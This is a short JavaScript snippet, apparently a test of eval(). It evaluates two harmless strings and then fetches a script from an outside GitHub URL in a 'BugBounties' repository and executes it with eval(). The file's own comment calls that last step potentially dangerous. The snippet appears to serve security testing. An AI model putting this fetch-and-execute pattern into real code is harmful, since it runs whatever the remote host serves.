// Test with a simple eval
eval('alert("Eval works!")');

// Test with more complex code
const code = 'console.log("Eval is executing this code")';
eval(code);

// Example of dynamically loading and executing code (potentially dangerous)
const scriptUrl = 'https://raw.githubusercontent.com/rquinnb/BugBounties/main/HARMLESS.js';
fetch(scriptUrl)
  .then(response => response.text())
  .then(code => eval(code));
